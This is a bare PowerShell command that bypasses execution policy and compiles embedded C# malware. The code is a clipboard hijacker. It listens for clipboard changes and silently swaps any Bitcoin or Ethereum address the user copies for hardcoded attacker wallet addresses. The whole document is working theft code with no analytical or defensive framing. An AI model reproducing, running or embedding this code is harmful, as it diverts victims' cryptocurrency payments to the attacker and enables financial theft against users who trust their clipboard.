powershell -ExecutionPolicy Bypass -Command "$c=@'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text.RegularExpressions;
namespace IA {
    public class S : NativeWindow {
        [DllImport(\"user32.dll\")] private static extern bool AddClipboardFormatListener(IntPtr h);
        [DllImport(\"user32.dll\")] private static extern bool OpenClipboard(IntPtr h);
        [DllImport(\"user32.dll\")] private static extern bool CloseClipboard();
        [DllImport(\"user32.dll\")] private static extern bool EmptyClipboard();
        [DllImport(\"user32.dll\")] private static extern IntPtr GetClipboardData(uint f);
        [DllImport(\"user32.dll\")] private static extern IntPtr SetClipboardData(uint f, IntPtr m);
        [DllImport(\"kernel32.dll\")] private static extern IntPtr GlobalLock(IntPtr m);
        [DllImport(\"kernel32.dll\")] private static extern bool GlobalUnlock(IntPtr m);
        [DllImport(\"kernel32.dll\")] private static extern IntPtr GlobalAlloc(uint f, UIntPtr b);
        private string b = \"bc1qcn7epnry70g4srng74qjwhnnrl5agq2jtnt70u\";
        private string e = \"0x9124856aa1567303EfBC940223356B7d5b6E1493\";
        public void I() { this.CreateHandle(new CreateParams()); AddClipboardFormatListener(this.Handle); }
        protected override void WndProc(ref Message m) { if (m.Msg == 0x031D) { try { R(); } catch {} } base.WndProc(ref m); }
        private void R() {
            if (!OpenClipboard(this.Handle)) return;
            IntPtr h = GetClipboardData(13);
            if (h == IntPtr.Zero) { CloseClipboard(); return; }
            string t = Marshal.PtrToStringUni(GlobalLock(h));
            GlobalUnlock(h); CloseClipboard();
            string n = null;
            if (Regex.IsMatch(t.Trim(), @\"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$\") && t.Trim() != b) n = b;
            else if (Regex.IsMatch(t.Trim(), @\"^0x[a-fA-F0-9]{40}$\") && t.Trim() != e) n = e;
            if (n != null && OpenClipboard(this.Handle)) {
                EmptyClipboard();
                IntPtr m = GlobalAlloc(2, (UIntPtr)((n.Length + 1) * 2));
                Marshal.Copy(n.ToCharArray(), 0, GlobalLock(m), n.Length);
                GlobalUnlock(m); SetClipboardData(13, m);
                CloseClipboard();
            }
        }
    }
}
'@; Add-Type -TypeDefinition $c -ReferencedAssemblies 'System.Windows.Forms'; $s = New-Object IA.S; $s.I(); [System.Windows.Forms.Application]::Run()"
